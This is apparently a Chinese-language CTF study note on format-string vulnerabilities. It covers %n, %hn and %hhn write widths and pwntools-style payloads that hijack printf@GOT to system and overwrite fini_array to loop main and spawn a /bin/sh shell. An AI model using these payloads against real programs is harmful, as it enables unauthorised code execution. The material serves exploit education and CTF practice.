+ %n:把当前**已经输出的字符数**，写入到给定地址

**————————————————————————————————————————————————————————————————————————**

# 常用类型
1️⃣ %n
写入类型：int（4字节 / 8字节平台仍是int）
写入长度：**4字节**
示例
printf("%100c%n", &addr);
效果：
*(int*)addr = 100
**——————————————————————————————**
2️⃣ %hn
写入类型：short
写入长度：**2字节**
只写低 2 字节

利用场景
**分段**写 4 字节或 8 字节地址

因为可以控制 0~65535,比较容易精确控制

常用打法
低2字节 → 高2字节
**——————————————————————————————**
3️⃣ %hhn
写入类型：char
写入长度：**1字节**
只写最低 1 字节

- 优点
+ 精确控制 0~255
+ 不容易溢出
+ 适合逐字节写地址

- 缺点
+ 需要写 4~8 次

现代利用最常用
因为,ASLR 下通常只需要改低字节

# 实际利用
## 小数字
- 当需要覆盖一个地址处的内容为**小于机器字长**的数字时便不能把目标地址放在payload开头了
- 例如2：payload=**b'aa' + b'%k$n' + b'xx' +p32(目标地址)** 
- 此处的b'xx'是**用作对齐**的，可灵活调整，这里假设'aa%k'为第6个参数，'$nxx'为第七个，则k=8

## 大数字
### GOT劫持
大数字则一般用于覆盖某个函数地址为想要的函数地址（例如system） 从而达到劫持效果，例如GOT劫持
这里以%hn为例
- `system_low = system_addr & 0xffff`
- `system_high = (system_addr >> 16) & 0xffff`**将system分为两个2字节写入**

- `payload = p32(printf_got) + p32(printf_got + 2)`**需要写入的地址分为高2字节与低2字节**
- `payload += b'%' + bytes(str(system_low - 8), "utf-8")`**-8是因为前面已经有了8字节**
- `payload += b'c%6$hn'`
- `payload += b'%' + bytes(str(system_high-system_low), "utf-8")`注意bytes（str(system_high-system_low)**不能换**成
p32(system_high-system_low)，因为假设system_high-system_low为1234，则需要凑成"%1234c%7$hn",这是**字符串**，不能直接作为数字解析，bytes则是因为**以字节流发送payload**
- `payload += b'c%7$hn'`
- `io.send(payload)`
- `payload = b'/bin/sh'`
- `io.sendline(payload)`

+ 程序执行流程

+ fini_array劫持可以通过**覆盖fini_array[0]**来使程序执行流在main函数结束后返回到指定的位置，比如重新返回到main进行循环利用或者直接用onegadget来getshell(fini_array地址可以在ida的**segments**中找到)

+ 举一个例子
- `int __cdecl main(int argc, const char **argv, const char **envp)`
- `{`
- `char format; // [esp+0h] [ebp-48h]`
- `setvbuf(stdin, 0, 2, 0);`
- `setvbuf(stdout, 0, 2, 0);`
- `puts("Welcome to my ctf! What's your name?");`
- `__isoc99_scanf("%64s", &format);`
- `printf("Hello ");`
- `printf(&format);`
- `return 0;`
- `}`
这是程序伪代码，可以看到存在一个格式化字符串漏洞，但仅能利用一次，且没有溢出漏洞，所以我们利用fini_array劫持来**循环利用**此漏洞，exp部分如下
- `payload = p32(fini_array_addr + 2) + p32(printf_got + 2)`
- `payload += p32(printf_got) + p32(fini_array_addr)`
- `payload += b'%' + bytes(str(main_high - 0x10),"utf_8") + b'c%4$hn'`
- `payload += b'%5$hn'` **system_high与main_high相同**
- `payload += b'%' + bytes(str(system_low - main_high),"utf-8") + b'c%6$hn'`
- `payload += b'%' + bytes(str(main_low - system_low),"utf-8") + b'c%7$hn'`
- `payload += b'\x00'`**截断printf**
- `io.sendlineafter("Welcome to my ctf! What's your name?",payload)`
- `payload1 = b'/bin/sh'`
- `io.sendlineafter("Welcome to my ctf! What's your name?",payload1)`
- 第3,5,6行也可以换做`payload+=(f'%{0x804-0x10}c%4$hn'+f'%{0x8534-0x804}c%5$hn').encode()`
`payload+=(f'%{0x10000-0x8534+0x804}c%6$hn'+f'%{0x83d0-0x804}c%7$hn').encode()`
-这里的encode()用于**将str转换为bytes**，而0x10000-0x8534+0x804则是因为%hn写入的是2字节，范围0x0000~0xFFFF,计数器超过0xffff，则会**截断**，0x10000&0xffff=0x0000
